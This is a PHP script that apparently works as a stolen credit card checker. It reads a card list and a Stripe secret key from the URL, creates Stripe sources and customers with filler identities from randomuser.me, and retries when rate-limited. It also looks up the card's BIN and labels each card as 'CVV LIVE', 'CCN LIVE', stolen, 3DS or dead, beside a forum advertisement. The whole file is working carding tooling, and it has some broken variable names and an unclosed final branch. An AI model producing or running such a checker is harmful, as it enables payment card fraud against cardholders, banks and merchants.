<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$sk = $_GET['sec'];
$lista = $_GET['lista'];
 $cc = multiexplode(array(":", "|", "", "/"), $lista)[0];
 $mes = multiexplode(array(":", "|", "", "/"), $lista)[1];
  $ano = multiexplode(array(":", "|", "", "/"), $lista)[2];
 $cvv = multiexplode(array(":", "|", " ", "/"), $lista)[3];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

////////////////////////////===[Random User ]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

$start = microtime(true);
$x = 0;  

while(true)  

{  

  $ch = curl_init(); // 1req
  //curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=juldeptrai&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
    $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  
  $token = $s['id'];
////////////
if (strpos($result1, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}

while(true)  

{  

$ch = curl_init(); // 2req 
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Gunnu Auth&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
 

$message = trim(strip_tags(getStr($result2,'"message": "','"')));


 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));

$cctwo = substr("$cc", 0, 6);

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  
}
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}
/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result2,'"cvc_check": "pass"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE</i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
}

elseif(strpos($result1, "generic_decline")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED INSUFF★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';}
elseif(strpos($result2,"do_not_honor")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result1,"fraudulent")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'<L</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID DATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID ACC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">LOST CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★FOR TRIALS ONLY★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CCN</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PICKUP CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">EXPIRED CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">RATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE FAILED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE-REQUIRED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';

